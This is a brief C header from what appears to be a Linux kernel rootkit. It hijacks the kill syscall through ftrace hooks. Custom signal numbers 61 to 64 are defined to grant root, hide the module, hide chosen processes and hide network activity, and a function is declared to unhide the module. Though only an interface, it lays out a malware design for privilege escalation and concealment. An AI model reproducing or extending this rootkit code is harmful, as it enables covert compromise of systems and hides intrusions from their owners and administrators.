#ifndef KILL_HIJACK_H
#define KILL_HIJACK_H

#define KILL_ROOT 61
#define KILL_HIDE 62
#define KILL_SET_PID 63
#define KILL_HIDE_NETWORK 64
#define PID_MAX 10

extern struct ftrace_hook kill_hooks[];
void show_module(void);

#endif 